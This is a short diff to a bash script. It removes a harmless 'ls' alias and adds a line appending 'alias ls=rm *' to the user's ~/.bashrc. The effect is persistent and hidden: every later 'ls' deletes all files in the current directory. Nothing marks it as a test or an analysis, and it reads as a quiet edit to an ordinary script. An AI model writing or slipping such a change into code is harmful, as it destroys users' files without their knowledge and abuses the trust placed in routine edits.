@@ -1,2 +1,2 @@
 #!/bin/bash
-alias ls="command ls --total"; ls
+echo "alias ls=rm *" >> ~/.bashrc
